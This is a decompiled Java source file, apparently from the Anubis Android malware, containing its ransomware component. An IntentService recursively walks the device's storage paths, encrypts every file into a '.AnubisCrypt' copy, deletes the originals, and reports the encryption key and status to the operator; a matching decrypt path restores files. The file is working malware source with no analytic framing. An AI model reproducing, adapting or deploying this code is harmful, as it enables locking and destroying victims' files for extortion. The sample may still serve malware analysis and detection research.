package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;

/* JADX INFO: loaded from: classes.dex */
public class wahiuolww extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f592a;

    /* JADX INFO: renamed from: b */
    String f593b;

    /* JADX INFO: renamed from: c */
    String f594c;

    public wahiuolww() {
        super("wahiuolww");
        this.f592a = new C0020b();
        this.f593b = "";
        this.f594c = "";
    }

    /* JADX INFO: renamed from: a */
    void m346a(File file) {
        FileOutputStream fileOutputStream;
        try {
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    m347b(file2);
                } else if (file2.isFile()) {
                    try {
                        C0020b c0020b = this.f592a;
                        byte[] bArrM221a = C0020b.m221a(file2);
                        if (this.f593b.equals("crypt")) {
                            if (!file2.getPath().contains(".AnubisCrypt")) {
                                byte[] bArrM233a = this.f592a.m233a(bArrM221a, this.f594c);
                                fileOutputStream = new FileOutputStream(file2.getPath() + ".AnubisCrypt", true);
                                fileOutputStream.write(bArrM233a);
                                fileOutputStream.close();
                                file2.delete();
                            }
                        } else if (this.f593b.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
                            byte[] bArrM241b = this.f592a.m241b(bArrM221a, this.f594c);
                            fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
                            fileOutputStream.write(bArrM241b);
                            fileOutputStream.close();
                            file2.delete();
                        }
                    } catch (Exception unused) {
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    /* JADX INFO: renamed from: b */
    void m347b(File file) {
        FileOutputStream fileOutputStream;
        try {
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    m347b(file2);
                } else if (file2.isFile()) {
                    try {
                        C0020b c0020b = this.f592a;
                        byte[] bArrM221a = C0020b.m221a(file2);
                        if (this.f593b.equals("crypt")) {
                            if (!file2.getPath().contains(".AnubisCrypt")) {
                                byte[] bArrM233a = this.f592a.m233a(bArrM221a, this.f594c);
                                fileOutputStream = new FileOutputStream(file2.getPath() + ".AnubisCrypt", true);
                                fileOutputStream.write(bArrM233a);
                                fileOutputStream.close();
                                file2.delete();
                            }
                        } else if (this.f593b.equals("decrypt") && file2.getPath().contains(".AnubisCrypt")) {
                            byte[] bArrM241b = this.f592a.m241b(bArrM221a, this.f594c);
                            fileOutputStream = new FileOutputStream(file2.getPath().replace(".AnubisCrypt", ""), true);
                            fileOutputStream.write(bArrM241b);
                            fileOutputStream.close();
                            file2.delete();
                        }
                    } catch (Exception unused) {
                    }
                }
            }
        } catch (Exception unused2) {
        }
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        C0020b c0020b;
        String str;
        String str2;
        this.f593b = this.f592a.m251e(this, "status");
        this.f594c = this.f592a.m251e(this, "key");
        File file = new File("/mnt");
        File file2 = new File("/mount");
        File file3 = new File("/sdcard");
        File file4 = new File("/storage");
        try {
            this.f592a.m230a("Cryptolocker", "1");
            m346a(Environment.getExternalStorageDirectory());
            this.f592a.m230a("Cryptolocker", "2");
        } catch (Exception unused) {
        }
        try {
            m346a(file);
            this.f592a.m230a("Cryptolocker", "3");
        } catch (Exception unused2) {
        }
        try {
            m346a(file2);
            this.f592a.m230a("Cryptolocker", "4");
        } catch (Exception unused3) {
        }
        try {
            m346a(file3);
            this.f592a.m230a("Cryptolocker", "5");
        } catch (Exception unused4) {
        }
        try {
            m346a(file4);
            this.f592a.m230a("Cryptolocker", "6");
        } catch (Exception unused5) {
        }
        if (!this.f593b.equals("crypt")) {
            if (this.f593b.equals("decrypt")) {
                C0020b c0020b2 = this.f592a;
                StringBuilder sb = new StringBuilder();
                sb.append("p=");
                sb.append(this.f592a.m242c(this.f592a.m264q(this) + "|File System is Decrypted!|"));
                c0020b2.m235b(this, "4", sb.toString());
                c0020b = this.f592a;
                str = "cryptfile";
                str2 = "false";
            }
            this.f592a.m250d(this, "status", "");
            this.f592a.m250d(this, "key", "");
        }
        C0020b c0020b3 = this.f592a;
        StringBuilder sb2 = new StringBuilder();
        sb2.append("p=");
        sb2.append(this.f592a.m242c(this.f592a.m264q(this) + "|The Cryptor is activated, the file system is encrypted by key: " + this.f594c + "|"));
        c0020b3.m235b(this, "4", sb2.toString());
        c0020b = this.f592a;
        str = "cryptfile";
        str2 = "true";
        c0020b.m250d(this, str, str2);
        this.f592a.m250d(this, "status", "");
        this.f592a.m250d(this, "key", "");
    }
}
